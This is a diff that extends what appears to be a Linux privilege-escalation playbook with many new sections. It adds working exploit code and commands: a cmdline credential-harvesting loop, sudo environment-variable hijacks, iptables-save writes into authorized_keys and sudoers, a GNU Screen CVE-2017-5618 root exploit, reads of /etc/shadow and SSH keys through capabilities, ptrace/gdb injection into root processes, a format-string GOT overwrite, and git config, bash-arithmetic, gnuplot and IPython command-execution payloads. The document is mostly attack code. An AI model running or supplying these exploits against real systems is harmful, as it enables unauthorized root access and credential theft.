@@ -423,6 +423,15 @@ ps auxf | grep -iE '\-\-inspect|\-\-debug|\-\-remote-debugging|debugger'
 ps auxf | grep -iE 'pass|secret|token|key|mysql.*-p|postgres.*-U'
 cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|secret|token|key' | head -20
 
+# Race-loop /proc/cmdline harvest — catches sshpass/mysql -p BEFORE argv scrubbing
+# Some processes overwrite argv immediately; tight loop catches the window
+while true; do
+  grep -ra "pass\|secret\|token" /proc/*/cmdline 2>/dev/null | tr '\0' ' '
+done > /tmp/cmdline_harvest.txt &
+# Let it run 60-120s during expected task execution, then kill and grep results
+sleep 120 && kill %1 2>/dev/null
+sort -u /tmp/cmdline_harvest.txt | grep -viE 'grep|cmdline_harvest'
+
 # Services running as root that may be exploitable
 ps auxf | grep -E '^root' | grep -ivE 'kernel|kthread|init|systemd' | head -30
 
@@ -1137,6 +1146,59 @@ ls -la /root/marker-engagement-envkeep-*.txt
 
 > **Generalization:** the LD_PRELOAD/LD_LIBRARY_PATH cases are just the dynamic-loader family. The same primitive (env_keep + writable path the var resolves to + root-side parser) applies to **shell startup** (BASH_ENV, ENV), **interpreter startup** (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS), **import/library paths** (PYTHONPATH, PERL5LIB, RUBYLIB, NODE_PATH), **XDG / HOME redirects** (XDG_CONFIG_HOME, HOME), and any **app-specific** `*_CONFIG` / `*_RC` / `*_PROFILE` (CURLRC, GITCONFIG, ANSIBLE_CONFIG, AWS_CONFIG_FILE, KUBECONFIG, IRBRC). Every preserved var that resolves to a parsed path is the same bug.
 
+> **SETENV vs env_keep:** The sudoers `SETENV` tag is a *distinct mechanism* from `env_keep`. `env_keep` preserves specific variables globally; `SETENV` appears per-command in `sudo -l` output as `(ALL) SETENV: NOPASSWD: /usr/bin/python3 *` and lets the invoker pass **any** environment variable to that specific command. If you see `SETENV:` in `sudo -l`, every env-based hijack above works without needing the var in `env_keep`. Identify with:
+
+```bash
+# Detect SETENV tag in sudo -l output
+sudo -l 2>/dev/null | grep -i "SETENV"
+# Example output: (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/app/run.py
+# The SETENV tag means you can inject ANY env var — PYTHONPATH, LD_PRELOAD, etc.
+
+# Exploit — same payloads as env_keep section above, but specify vars inline:
+mkdir -p /tmp/evil && echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' > /tmp/evil/os.py
+sudo PYTHONPATH=/tmp/evil /usr/bin/python3 /opt/app/run.py
+/tmp/rootbash -p
+
+# LD_PRELOAD via SETENV (if binary is dynamically linked):
+sudo LD_PRELOAD=/tmp/libhax.so /usr/bin/python3 /opt/app/run.py
+```
+
+### 4.1e iptables --comment Newline Injection + iptables-save Arbitrary File Write
+
+When `sudo -l` allows `iptables` and/or `iptables-save`, the `--comment` field accepts newline-escaped content. Combined with `iptables-save -f <PATH>`, this writes attacker-controlled text to any root-writable file (SSH authorized_keys, sudoers drop-in, cron).
+
+```bash
+# Detect — sudo permits iptables commands
+sudo -l
+# Look for: (root) NOPASSWD: /usr/sbin/iptables *
+#           (root) NOPASSWD: /usr/sbin/iptables-save *
+
+# Step 1: Inject SSH pubkey via --comment with embedded newlines
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_PUBKEY>\n'
+
+# Step 2: Write the rules file (contains the comment with your key) to authorized_keys
+sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
+
+# Step 3: Connect as root
+ssh -i <PRIVATE_KEY> root@<TARGET>
+```
+
+```bash
+# Alternative: write a sudoers drop-in for persistent NOPASSWD
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<USER> ALL=(ALL) NOPASSWD: ALL\n'
+sudo /usr/sbin/iptables-save -f /etc/sudoers.d/pwn
+sudo /bin/bash
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure iptables + iptables-save (both ship with netfilter-persistent / iptables package)
+# No external tools needed — the above IS the LOTL approach
+# If iptables-save is not in sudo, but iptables -j LOG is allowed:
+# redirect via LOG + syslog rule (less reliable, requires syslog config control)
+```
+
 ### 4.2 SUID / SGID Abuse
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -1155,7 +1217,146 @@ ldd /path/to/suid_binary
 # Compile malicious .so and place in writable path
 ```
 
-### 4.2b Custom SUID Binary — ret2libc / ROP Exploitation
+### 4.2b SUID capsh — Capability-Aware Shell Escape
+
+When `capsh` is SUID-root (or has `cap_setuid+ep`), it can drop directly to a root shell by setting uid/gid to 0. GTFOBins lists this but the exact invocation depends on capsh version.
+
+```bash
+# Detect SUID capsh
+find / -name "capsh" -perm -4000 2>/dev/null
+ls -la /usr/sbin/capsh
+
+# Exploit — drop to root shell
+/usr/sbin/capsh --gid=0 --uid=0 --
+# Returns: root shell (uid=0 gid=0)
+
+# If capsh lacks --uid/--gid flags (older version), use --caps then exec
+/usr/sbin/capsh --caps="cap_setuid+ep" -- -c 'exec /bin/bash -p'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# capsh IS a native tool (part of libcap2-bin); no download needed
+# The above commands are already LOTL — capsh ships with standard installs
+```
+
+### 4.2c SUID GNU Screen 4.05.00 — CVE-2017-5618
+
+GNU screen 4.05.00 SUID binary allows writing to `/etc/ld.so.preload` via a crafted shared library, yielding root on any subsequent SUID binary execution. Affects screen exactly version 4.05.00.
+
+```bash
+# Detect — confirm SUID screen at vulnerable version
+ls -la /usr/bin/screen-4.5.0 /usr/bin/screen 2>/dev/null
+screen --version 2>/dev/null
+# Vulnerable: Screen version 4.05.00
+
+# Step 1: Create a shared library that spawns root shell
+cat > /tmp/libhax.c <<'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void) {
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+
+# Step 2: Create the root shell binary
+cat > /tmp/rootshell.c <<'EOF'
+#include <stdio.h>
+int main(void) {
+    setuid(0); setgid(0);
+    seteuid(0); setegid(0);
+    execvp("/bin/sh", NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+
+# Step 3: Exploit — screen creates /etc/ld.so.preload pointing to our lib
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+# ld.so.preload now contains /tmp/libhax.so
+
+# Step 4: Trigger the preload (any SUID binary loads it)
+/usr/bin/su --help 2>/dev/null
+# libhax constructor fires: chowns /tmp/rootshell to root + sets SUID
+
+# Step 5: Root shell
+/tmp/rootshell
+id
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The exploit itself uses only gcc + screen (both present on the target)
+# If gcc is unavailable, cross-compile libhax.so and rootshell on attacker, transfer
+# Minimum needed on target: SUID screen 4.05.00 + ability to write /tmp
+```
+
+### 4.2d GDB / PEDA — Recover Hardcoded Password from SUID Binary
+
+When a custom SUID binary compares user input against a hardcoded password (via `strcmp`, `strncmp`, `memcmp`), break on the comparison function and read the expected value from registers/stack. Faster than reversing the binary statically.
+
+```bash
+# Triage — confirm it's a custom SUID that prompts for a password
+ls -la <SUID_BINARY>
+strings <SUID_BINARY> | grep -iE 'pass|enter|auth|secret|key'
+ltrace <SUID_BINARY> 2>&1 | grep -iE 'strcmp|strncmp|memcmp'
+# ltrace output reveals: strcmp("user_input", "s3cr3tP@ss") = ... → immediate win
+```
+
+```bash
+# If ltrace doesn't show it (static binary, or stripped), use gdb
+gdb -q <SUID_BINARY>
+# Set breakpoint on comparison functions
+(gdb) break strcmp
+(gdb) break strncmp
+(gdb) break memcmp
+(gdb) run
+
+# When breakpoint hits, examine arguments (x86_64 calling convention: rdi=arg1, rsi=arg2)
+(gdb) x/s $rdi
+(gdb) x/s $rsi
+# One of these is the hardcoded password, the other is your input
+
+# For 32-bit (i386): arguments on stack
+(gdb) x/s *(char**)($esp+4)
+(gdb) x/s *(char**)($esp+8)
+
+# Continue to find multiple comparisons
+(gdb) continue
+```
+
+```bash
+# PEDA/GEF enhanced workflow (auto-prints args on break)
+gdb -q <SUID_BINARY>
+# With PEDA loaded, context shows args automatically
+(gdb) break strcmp
+(gdb) run <<< "AAAA"
+# PEDA prints: Arg[0] = "AAAA"  Arg[1] = "actual_password_here"
+
+# Extract and use the password
+echo "<RECOVERED_PASSWORD>" | <SUID_BINARY>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ltrace is the fastest LOTL approach (ships with most distros)
+ltrace <SUID_BINARY> <<< "test" 2>&1 | grep -i 'strcmp\|strncmp\|memcmp'
+# If ltrace unavailable, strace can reveal via read() buffers but less direct
+strace -e trace=read,write -s 200 <SUID_BINARY> <<< "test" 2>&1 | grep -i pass
+# strings remains the baseline (no execution needed)
+strings <SUID_BINARY> | less
+```
+
+### 4.2e Custom SUID Binary — ret2libc / ROP Exploitation
 
 When a SUID-root binary reads user input into a fixed stack buffer with NX enabled, ret2libc / ROP via libc offsets is the path to root.
 
@@ -1253,7 +1454,7 @@ ls -la /root/marker-engagement-suid-rop-*.txt
 
 > **Tip:** On x86_64, `system()` calls `movaps` on stack-aligned data — insert an extra `ret` gadget before the `system` call
 
-### 4.2c Firejail `--join` User-Namespace LPE — CVE-2022-31214
+### 4.2f Firejail `--join` User-Namespace LPE — CVE-2022-31214
 
 **Two-Shell Race Against `/proc/<PID>/uid_map` During Namespace Setup → Root in Initial NS**
 Affects Firejail ≤ 0.9.68. SUID `firejail` binary mishandles user-namespace creation when joining its own sandbox: shell 1 starts `firejail --join=<own-pid>`, shell 2 races writes to the target's `uid_map` while the namespace is being set up, ending with uid 0 in the **initial** (host) namespace — not the sandbox.
@@ -1318,6 +1519,218 @@ getcap -r / 2>/dev/null
 
 # Perl with cap_setuid
 perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+```
+
+### 4.3b cap_dac_read_search — Arbitrary File Read via Capable Binaries
+
+When a binary has `cap_dac_read_search+ep`, it bypasses filesystem read permission checks entirely. Any file on the system (including `/etc/shadow`, SSH keys, databases) is readable through that binary regardless of ownership/mode.
+
+```bash
+# Detect binaries with cap_dac_read_search
+getcap -r / 2>/dev/null | grep dac_read_search
+# Example output: /usr/bin/tac = cap_dac_read_search+ep
+
+# Exploit — read /etc/shadow (proves arbitrary file read)
+/usr/bin/tac /etc/shadow
+/usr/bin/cat /etc/shadow
+/usr/bin/head -n 5 /etc/shadow
+/usr/bin/less /etc/shadow
+/usr/bin/xxd /etc/shadow | head -50
+/usr/bin/base64 /etc/shadow | base64 -d
+
+# Read root SSH private key
+/usr/bin/tac /root/.ssh/id_rsa | tac
+
+# Read any config with credentials
+/usr/bin/cat /etc/openvpn/auth.txt
+/usr/bin/cat /var/lib/mysql/mysql.cnf
+```
+
+```bash
+# If the capable binary is 'tar' or 'zip' — archive then extract
+/usr/bin/tar czf /tmp/shadow.tgz /etc/shadow 2>/dev/null && tar xzf /tmp/shadow.tgz -C /tmp/
+cat /tmp/etc/shadow
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The exploit IS LOTL — the capable binary (cat/tac/head/less/xxd/base64) is a system tool
+# No downloads needed; the capability on the binary is the entire attack surface
+# Crack the extracted shadow hashes offline:
+# john --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash
+# hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt
+```
+
+### 4.3c CAP_SYS_PTRACE — GDB Attach + Shellcode Injection into Root Process
+
+When a binary has `cap_sys_ptrace+ep` (or the current user has it via ambient capabilities), you can attach to any running process (including root-owned) and inject shellcode or call `system()` directly in its memory space.
+
+```bash
+# Detect
+getcap -r / 2>/dev/null | grep sys_ptrace
+# Or check if python3/gdb has it:
+# /usr/bin/python3.x = cap_sys_ptrace+ep
+
+# Find a root-owned process to attach to (pick a long-running one)
+ps -ef | grep -E "^root" | grep -v "\[" | head -20
+# Good targets: apache2, nginx, sshd, cron, mysqld — stable, won't crash on inject
+```
+
+```bash
+# Method 1: Python with cap_sys_ptrace — inject via ctypes/ptrace
+/usr/bin/python3.x -c '
+import ctypes, sys, struct
+
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_POKETEXT = 4
+PTRACE_GETREGS = 12
+PTRACE_SETREGS = 13
+PTRACE_CONT = 7
+
+libc = ctypes.CDLL("libc.so.6")
+pid = int(sys.argv[1])
+
+# Attach to root process
+libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
+import os, signal, time
+os.waitpid(pid, 0)
+
+# At this point you are attached — inject shellcode or use /proc/<pid>/mem
+# Simpler: write a reverse shell command via /proc/pid/mem at a known address
+print(f"[+] Attached to PID {pid} as root-equivalent")
+libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+' <ROOT_PID>
+```
+
+```bash
+# Method 2: GDB with cap_sys_ptrace (more reliable for code injection)
+gdb -q -p <ROOT_PID> -batch \
+  -ex 'call (int)system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' \
+  -ex 'detach' \
+  -ex 'quit'
+/tmp/rootbash -p
+```
+
+```bash
+# Method 3: Inject bind shell shellcode via /proc/<PID>/mem (no gdb needed)
+# Generate shellcode (on attacker box):
+# msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f hex
+# Then write to an executable region of the target process via /proc/<PID>/mem
+# (complex — use the gdb method above when available)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# If gdb is available (often is on dev boxes):
+gdb -q -p <ROOT_PID> -batch -ex 'call (int)system("id > /tmp/ptrace_proof")' -ex 'detach' -ex 'quit'
+cat /tmp/ptrace_proof
+
+# If only python3 has the cap: use the ctypes approach above
+# If neither gdb nor python3 has it but you have the raw cap:
+# Write directly to /proc/<ROOT_PID>/mem (requires calculating RIP + writable region)
+cat /proc/<ROOT_PID>/maps | grep "r-xp" | head -5
+```
+
+### 4.3d binfmt_misc Credentials-Flag Privesc (cap_dac_override or Write to /proc/sys/fs/binfmt_misc)
+
+If you can write to `/proc/sys/fs/binfmt_misc/register` (via `cap_dac_override`, a container misconfiguration, or direct mount access), register a handler with the `C` (credentials) flag. The `C` flag causes the kernel to execute the interpreter with the credentials of the *binary being run* — meaning if you register a handler for SUID-root binaries, your interpreter runs as root.
+
+```bash
+# Detect — can you write to binfmt_misc?
+ls -la /proc/sys/fs/binfmt_misc/register
+cat /proc/sys/fs/binfmt_misc/status
+# If mounted and writable (common in containers with --privileged or cap_dac_override):
+mount | grep binfmt_misc
+
+# Also check: do you have cap_dac_override?
+getcap -r / 2>/dev/null | grep dac_override
+grep -i cap /proc/self/status
+```
+
+```bash
+# Step 1: Create interpreter script that spawns a shell
+cat > /tmp/binfmt_handler <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+exec /usr/bin/python3 "$@" 2>/dev/null
+EOF
+chmod +x /tmp/binfmt_handler
+
+# Step 2: Register a binfmt_misc entry with the C (credentials) flag
+# Format: :name:type:offset:magic:mask:interpreter:flags
+# Target Python scripts (magic bytes matching #!/usr/bin/python3 shebang isn't needed — use ELF magic for SUID binaries)
+echo ':pwn:M::\x7fELF:\xff\xff\xff\xff:/tmp/binfmt_handler:C' > /proc/sys/fs/binfmt_misc/register
+
+# Step 3: Execute any SUID-root ELF binary — kernel runs /tmp/binfmt_handler AS ROOT
+/usr/bin/su --help 2>/dev/null
+# The C flag causes binfmt_handler to inherit su's SUID credentials
+
+# Step 4: Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The technique uses only bash + echo + chmod — fully LOTL
+# Prerequisite is write access to /proc/sys/fs/binfmt_misc/register
+# In containers: often available by default with --privileged flag
+# On host: requires cap_dac_override or running in a user namespace with binfmt_misc mounted
+```
+
+### 4.3e Format String Exploitation — %n GOT Overwrite via printf(user_input)
+
+When a SUID-root binary passes user-controlled input directly to `printf()` without a format string (`printf(buf)` instead of `printf("%s", buf)`), the `%n` specifier writes to memory. Combined with GOT overwrite, this yields code execution as the binary's effective user (root if SUID).
+
+```bash
+# Detect — identify format string vulnerability
+ltrace <SUID_BINARY> <<< 'AAAA%08x.%08x.%08x.%08x'
+# If output shows hex values (stack leak), it's vulnerable
+./<SUID_BINARY> 'AAAA%08x.%08x.%08x.%08x'
+# Vulnerable output: AAAA41414141.xxxxx.xxxxx.xxxxx
+
+# Step 1: Find the offset (position of your input on the stack)
+for i in $(seq 1 20); do echo -n "$i: "; ./<SUID_BINARY> "AAAA%${i}\$x"; echo; done
+# When output shows 41414141 → that's your offset (e.g., offset=7)
+```
+
+```python
+# Step 2: pwntools exploitation — overwrite printf@GOT with system()
+from pwn import *
+
+elf = ELF('<SUID_BINARY>')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# Leak libc address via format string
+io = process(elf.path)
+io.sendline(b'%<OFFSET>$s' + p64(elf.got['printf']))  # leak printf@GOT
+
+leaked = u64(io.recv(6).ljust(8, b'\x00'))
+libc.address = leaked - libc.symbols['printf']
+log.success(f'libc base: {hex(libc.address)}')
+
+# Overwrite printf@GOT with system() using fmtstr_payload
+io2 = process(elf.path)
+payload = fmtstr_payload(<OFFSET>, {elf.got['printf']: libc.symbols['system']})
+io2.sendline(payload)
+
+# Next call to printf(buf) becomes system(buf) — send "/bin/sh"
+io2.sendline(b'/bin/sh')
+io2.interactive()
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Manual %hhn writes (no pwntools — works from target shell directly)
+# Calculate target address and value bytes, then construct format string:
+# printf '\x<GOT_ADDR_BYTES>%<PAD>c%<OFFSET>$hhn' | ./<SUID_BINARY>
+# This is tedious manually but possible without any tools beyond printf + the SUID binary
+# For exam: use pwntools on attacker box, pipe payload via stdin to target over SSH/shell
 ```
 
 ### 4.4 Cron Job Hijacking
@@ -1654,6 +2067,305 @@ echo -e "all:\n\tcp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > <PROJE
 
 > **Tip:** Build-system hijacks share a class signature with §4.4 cron-script-hijack but operate at *compile time* rather than runtime. Look for any root-run job that invokes a build/install/package command (`cargo`, `npm`, `pip`, `make`, `gradle`, `go build`, `dotnet restore`) over a tree where you can write *any* file the build pipeline reads — `Cargo.toml`, `package.json`, `setup.py`, `Makefile`, `build.gradle`, `pom.xml`, `.cargo/config.toml`, `~/.cargo/registry/`. The toolchain itself is the exec primitive.
 
+### 4.4e Git Config Privesc — core.fsmonitor / core.sshCommand / hooksPath / pager
+
+When a privileged user (root cron, another user's git hook, CI runner) executes `git` operations inside a repository you can write to, several git config directives execute arbitrary commands. Detection via `pspy` shows the git invocation; exploitation is dropping a `.git/config` or `.gitconfig` that triggers code execution on the next `git status`/`git pull`/`git commit`.
+
+```bash
+# Detect — find root/other-user git operations via pspy or cron inspection
+grep -rE "git (pull|fetch|status|log|commit|push|clone)" /etc/cron* /var/spool/cron/ 2>/dev/null
+systemctl list-timers --all 2>/dev/null
+# Run pspy to catch periodic git operations by root
+./pspy64 2>/dev/null | grep -i git
+```
+
+```bash
+# Exploit A: core.fsmonitor — executes on ANY git command (status, diff, add, commit)
+# Requires: write access to .git/config in a repo where root runs git
+cd <REPO_PATH>
+git config core.fsmonitor "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash && echo"
+# Next time root runs `git status` (or any git command) in this repo → payload fires
+# Collect: /tmp/rootbash -p
+```
+
+```bash
+# Exploit B: core.sshCommand — fires on git fetch/pull/push over SSH
+git config core.sshCommand "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; ssh"
+# Triggers when root does: git pull / git fetch / git push
+```
+
+```bash
+# Exploit C: core.hooksPath — redirect hooks to attacker-controlled directory
+mkdir -p /tmp/evil-hooks
+cat > /tmp/evil-hooks/pre-commit <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+EOF
+chmod +x /tmp/evil-hooks/pre-commit
+git config core.hooksPath /tmp/evil-hooks
+# Triggers on: git commit (pre-commit), git push (pre-push), etc.
+```
+
+```bash
+# Exploit D: core.pager / core.editor — fires on git log, git diff, git commit
+git config core.pager "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; less"
+git config core.editor "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; vim"
+# Pager triggers on: git log, git diff, git show (any paged output)
+# Editor triggers on: git commit (without -m), git rebase
+```
+
+```bash
+# Exploit E: include.path — include a malicious gitconfig from writable location
+cat > /tmp/evil.gitconfig <<'EOF'
+[core]
+    fsmonitor = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash && echo"
+EOF
+git config include.path /tmp/evil.gitconfig
+```
+
+```bash
+# Exploit F: gitattributes filter — fires on git checkout / git add
+# Create .gitattributes in the repo root (writable to you)
+echo '* filter=pwn' > <REPO_PATH>/.gitattributes
+git config filter.pwn.clean "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; cat"
+git config filter.pwn.smudge "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; cat"
+# Triggers on: git checkout, git add, git diff (any content filtering)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# All exploits above use only git config (ships with git) + shell commands
+# No external tools needed — the git binary itself is the execution engine
+# Minimum: write access to .git/config (or global ~/.gitconfig for the target user)
+```
+
+### 4.4f Bash Arithmetic-Context Command Injection — (( )) and [[ -eq ]]
+
+Bash evaluates `$(...)` and backticks recursively inside arithmetic contexts (`(( ))`, `[[ x -eq y ]]`, `$[...]`, `let`). When a root-run script compares an attacker-tainted variable using integer comparison, the `a[$(...)]` payload format triggers arbitrary command execution inside the arithmetic evaluator.
+
+```bash
+# Vulnerable pattern in a root-run script:
+# #!/bin/bash
+# read -r val < /tmp/user_input   (or val from attacker-writable file/env)
+# if [[ "$val" -eq 42 ]]; then ...
+# OR: (( val == 42 ))
+# OR: result=$((val + 1))
+
+# Exploitation: set the tainted variable to an array subscript with command substitution
+# The payload: a[$(COMMAND)]  — bash evaluates COMMAND during arithmetic parsing
+
+# Step 1: Identify the writable input source consumed by the root script
+cat /etc/cron* /var/spool/cron/* 2>/dev/null | grep -E '\[\[.*-eq|-ne|-gt|-lt|-ge|-le\]|\(\('
+find /etc/cron* -exec grep -lE '\$\(\(' {} \; 2>/dev/null
+# Look for scripts that read from files/env you control, then use the value in arithmetic
+
+# Step 2: Inject the payload into the attacker-controlled input
+echo 'a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]' > /tmp/user_input
+# Or if the script reads from an env var / command arg:
+export ATTACKER_VAR='a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]'
+
+# Step 3: Wait for the cron/root-script to evaluate it
+# When bash hits: [[ "$val" -eq 42 ]]
+# It parses "a[$(cp /bin/bash ...)]" as arithmetic → evaluates the $(...) → root RCE
+
+# Collect
+/tmp/rootbash -p
+```
+
+```bash
+# Variant: metadata injection via exiftool + arithmetic comparison
+# If a root script reads EXIF metadata and compares it numerically:
+# width=$(exiftool -s3 -ImageWidth "$file")
+# if [[ "$width" -eq 1920 ]]; then ...
+# Inject the payload into the EXIF tag:
+exiftool -ImageWidth='a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]' <IMAGE_FILE>
+# When the root script reads and compares it → RCE
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The injection IS the technique — you only need to write to the input source
+# No tools beyond echo/printf needed on the target
+# The vulnerable script does the execution for you via bash's own arithmetic parser
+echo 'a[$(id > /tmp/proof)]' > <ATTACKER_WRITABLE_INPUT>
+```
+
+### 4.4g Bash [[ ]] Glob Pattern-Matching Oracle — Char-by-Char Secret Leak
+
+When a root-run script uses unquoted RHS in `[[ $secret == $user_input ]]`, bash interprets glob metacharacters (`*`, `?`, `[...]`) in `$user_input` as pattern-matching operators rather than literal characters. By iterating single characters with `?` wildcards, an attacker leaks the secret byte-by-byte via exit code timing/observation.
+
+```bash
+# Vulnerable pattern in a root-run script:
+# #!/bin/bash
+# SECRET=$(cat /root/secret.txt)
+# read -r guess
+# if [[ $SECRET == $guess ]]; then echo "correct"; fi
+# NOTE: the RHS ($guess) is UNQUOTED — bash treats it as a glob pattern
+
+# Exploitation: brute-force character by character using glob patterns
+# The glob 'A*' matches any string starting with 'A'
+# If the script outputs "correct" (or has observable side effects), you know the prefix
+
+# Step 1: Identify the feedback channel (output, timing, file creation, etc.)
+# Step 2: Iterate characters
+
+# Manual single-char test
+echo 'a*' > /tmp/guess_input     # does the script match? if yes, secret starts with 'a'
+echo 'b*' > /tmp/guess_input     # test 'b'...
+
+# Automated oracle (when you can observe the script's exit code or output)
+KNOWN=""
+CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}"
+while true; do
+  FOUND=0
+  for c in $(echo "$CHARSET" | fold -w1); do
+    echo "${KNOWN}${c}*" > /tmp/guess_input
+    # Trigger the root script and check for match feedback
+    # (method depends on how the script is invoked — cron output, log file, etc.)
+    if grep -q "correct" /tmp/script_output 2>/dev/null; then
+      KNOWN="${KNOWN}${c}"
+      FOUND=1
+      echo "[+] Found: $KNOWN"
+      break
+    fi
+  done
+  [ $FOUND -eq 0 ] && break
+done
+echo "[*] Secret: $KNOWN"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure bash — no tools needed beyond echo and the ability to write to the input source
+# The glob pattern itself is the oracle; bash's built-in pattern matching does the work
+# Same technique works against [[ $x == $y ]] or case $x in $y) patterns
+```
+
+### 4.4h Gnuplot system() RCE via Writable .plt Directory
+
+When a root cron/systemd job executes gnuplot scripts from a directory you can write to, gnuplot's `system()` function and backtick evaluation provide arbitrary command execution.
+
+```bash
+# Detect — find root-invoked gnuplot
+grep -rE "gnuplot" /etc/cron* /etc/systemd/system/ /usr/local/bin/ /opt/ 2>/dev/null
+find / -name "*.plt" -o -name "*.gnuplot" 2>/dev/null | xargs ls -la 2>/dev/null
+# Check if the .plt directory or files are writable
+find / -name "*.plt" -writable 2>/dev/null
+```
+
+```bash
+# Exploit — inject system() call into writable .plt file
+cat > <WRITABLE_PLT_PATH>/pwn.plt <<'EOF'
+system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+EOF
+
+# Or modify an existing .plt file (append to end)
+echo 'system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' >> <EXISTING_PLT_FILE>
+
+# Alternative: backtick evaluation (gnuplot evaluates backticks as shell commands)
+echo 'title = `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`' >> <EXISTING_PLT_FILE>
+
+# Wait for cron/timer → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only echo/cat needed to write the payload — gnuplot itself runs it
+# No external tools required on target beyond write access to the .plt path
+echo 'system("id > /tmp/gnuplot_proof")' > <WRITABLE_PLT_PATH>/test.plt
+```
+
+### 4.4i IPython CWD profile_default/startup Auto-Execution (CVE-2022-21699)
+
+IPython < 8.0.1 loads `profile_default/startup/*.py` from the current working directory. If a privileged user (root cron, another user) runs `ipython` or `jupyter` from a directory you can write to, any `.py` file in `./profile_default/startup/` executes automatically.
+
+```bash
+# Detect — find privileged ipython/jupyter invocations
+grep -rE "ipython|jupyter" /etc/cron* /var/spool/cron/ /etc/systemd/system/ 2>/dev/null
+ps auxf | grep -iE "ipython|jupyter" | grep -v grep
+# Check ipython version
+ipython --version 2>/dev/null   # vulnerable: < 8.0.1
+
+# Identify the CWD of the target invocation
+ls -la /proc/<PID>/cwd 2>/dev/null
+```
+
+```bash
+# Exploit — plant startup script in CWD
+mkdir -p <TARGET_CWD>/profile_default/startup
+cat > <TARGET_CWD>/profile_default/startup/00-pwn.py <<'EOF'
+import os
+os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+EOF
+
+# Wait for the privileged ipython session to start → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only mkdir + cat/echo needed — ipython loads the file itself
+# No pip install, no downloads required
+mkdir -p ./profile_default/startup
+echo 'import os; os.system("id > /tmp/ipy_proof")' > ./profile_default/startup/00-pwn.py
+```
+
+### 4.4j git apply Symlink Privesc (CVE-2023-23946)
+
+When `sudo -l` allows `git apply` as root (or another user), CVE-2023-23946 allows writing to arbitrary paths via a crafted patch that first creates a symlink, then writes through it. Affects git < 2.39.2.
+
+```bash
+# Detect
+sudo -l | grep -i "git"
+git --version   # vulnerable: < 2.39.2
+
+# Step 1: Create a malicious patch that plants a symlink then writes through it
+cat > /tmp/evil.patch <<'EOF'
+diff --git a/symlink b/symlink
+new file mode 120000
+index 0000000..<BLOB_HASH>
+--- /dev/null
++++ b/symlink
+@@ -0,0 +1 @@
++/etc/sudoers.d/pwn
+\ No newline at end of file
+diff --git a/symlink b/symlink
+deleted file mode 120000
+index <BLOB_HASH>..0000000
+--- a/symlink
++++ /dev/null
+@@ -1 +0,0 @@
+-/etc/sudoers.d/pwn
+\ No newline at end of file
+diff --git a/symlink b/symlink
+new file mode 100644
+index 0000000..0000000
+--- /dev/null
++++ b/symlink
+@@ -0,0 +1 @@
++<USER> ALL=(ALL) NOPASSWD: ALL
+EOF
+
+# Step 2: Apply as root
+cd /tmp/workdir && git init
+sudo git apply /tmp/evil.patch
+# Result: /etc/sudoers.d/pwn is created with our content
+
+# Step 3: Escalate
+sudo /bin/bash
+```
+
